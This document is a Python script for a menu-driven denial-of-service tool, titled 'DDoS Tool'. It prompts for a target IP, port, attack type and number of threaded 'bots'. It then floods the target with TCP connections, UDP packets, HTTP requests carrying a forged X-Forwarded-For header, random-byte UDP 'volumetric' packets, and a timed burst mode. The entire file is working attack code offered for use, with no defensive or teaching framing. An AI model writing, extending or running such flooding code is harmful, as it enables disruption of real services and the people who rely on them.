import os
import threading
import socket
import random
import requests
import time

attack_counts = {}
target_ip = ""
target_port = 0
attack_type = ""
num_bots = 0

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def attack(target_ip, target_port, bot_id, attack_type, fake_ip):
    attack_count = 0
    while True:
        try:
            if attack_type == "TCP":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            elif attack_type == "UDP":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            elif attack_type == "HTTP":
                url = f"http://{target_ip}:{target_port}"
                headers = {"X-Forwarded-For": fake_ip}
                response = requests.get(url, headers=headers)
                print(f"HTTP attack sent by bot {bot_id} to {url} with response code {response.status_code}")
                continue
            elif attack_type == "VOLUMETRIC":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(1024)
                s.sendto(packet, (target_ip, target_port))
                print(f"Volumetric attack sent by bot {bot_id} to {target_ip} on port {target_port}")
                continue
            elif attack_type == "ANTI_SYSTEM_ATTACK":
                # Attack logic for 10 seconds every 7 seconds
                while True:
                    start_time = time.time()
                    end_time = start_time + 10
                    while time.time() < end_time:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        packet = random._urandom(1024)
                        s.sendto(packet, (target_ip, target_port))
                        s.close()
                        attack_count += 1
                        attack_counts[bot_id] = attack_count
                        print(f"Bot {bot_id} ({fake_ip}) anti-system attack sent to {target_ip} on port {target_port}")
                    time.sleep(7)
                continue
            else:
                print("\033[91mInvalid attack type. Please choose TCP, UDP, HTTP, VOLUMETRIC, or ANTI_SYSTEM_ATTACK.\033[0m")
                return

            if attack_type == "TCP":
                s.connect((target_ip, target_port))
                s.send(b"GET / HTTP/1.1\r\n\r\n")
            elif attack_type == "UDP":
                s.sendto(b"GET /", (target_ip, target_port))

            attack_count += 1
            attack_counts[bot_id] = attack_count
            print(f"Bot {bot_id} ({fake_ip}) attack sent to {target_ip} on port {target_port} using {attack_type} attack")

            s.close()
        except Exception as e:
            print("Error:", e)
            break

def display_banner():
    banner = r'''                                                                 
                                                                                                      
                                                                                                              
                                                                                                              
                                           ███                                                                
                                          ███             ███████████████████████████████                            
                               ████████████████████████████████████████████████████████████████████████████   
                         ███████████████████████████████▒▒▒█    █▒▒▒▒▒███████████████████████████████████▒    
                    ██████████████████████████      █████████████████████████████████▓▓▓▓▓▓██████████████▒    
                                         █████████████████████████████████████████              ██████████░    
                                         ███████████                  ▓████████                                
                                       ███████████████████████████████████    █                   _____    ___  
                  ████████████████████████████████████████████████████ ▓ ██████           /\     |  __ \  |__ \ 
                     ███████████████████████░ ████                     ████▒   █         /  \    | |__) |    ) |
                                         ▒██  ███                         ██████        / /\ \   |  _  /    / / 
                                         █    ███                          █████       / ____ \  | | \ \   / /_ 
                                         ▓███████                                     /_/    \_\ |_|  \_\ |____| 
                                          ██████                                                                 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
'''
    print("\033[91m" + banner + "\033[0m")

def menu():
    display_banner()
    print("\033[91mDDoS Tool Menu:\033[0m")
    print("\033[91m1. Launch attack\033[0m")
    print("\033[91m2. Display information\033[0m")
    print("\033[91m3. Exit\033[0m")
    choice = input("\033[91mEnter your choice: \033[0m")
    return choice

def get_attack_params():
    clear_screen()
    global target_ip, target_port, attack_type
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    attack_type = input("Enter attack type (TCP/UDP/HTTP/VOLUMETRIC/ANTI_SYSTEM_ATTACK): ").upper()

def display_information():
    global target_ip, target_port, attack_type, num_bots
    clear_screen()
    print("\033[91mAttack Information:\033[0m")
    print(f"\033[91mTarget IP:\033[0m {target_ip}")
    print(f"\033[91mTarget Port:\033[0m {target_port}")
    print(f"\033[91mAttack Type:\033[0m {attack_type}")
    print(f"\033[91mNumber of Bots:\033[0m {num_bots}")
    print("\033[91mBot Attack Counts:\033[0m")
    for bot_id, count in attack_counts.items():
        print(f"Bot {bot_id}: {count} attacks")

def create_attacks():
    global target_ip, target_port, attack_type, num_bots
    threads = []
    for i in range(num_bots):
        fake_ip = generate_fake_ip()
        thread = threading.Thread(target=attack, args=(target_ip, target_port, i+1, attack_type, fake_ip))
        thread.start()
        threads.append(thread)
    return threads

def main():
    global num_bots
    has_displayed_menu = False
    threads = []

    while True:
        if not has_displayed_menu:
            choice = menu()
            has_displayed_menu = True

        if choice == "1":
            get_attack_params()
            num_bots = int(input("Enter number of bots: "))
            threads = create_attacks()
        elif choice == "2":
            display_information()
        elif choice == "3":
            clear_screen()
            for thread in threads:
                thread.join()
            print("\033[91mExiting...\033[0m")
            break
        else:
            clear_screen()
            has_displayed_menu = False

if __name__ == "__main__":
    main()
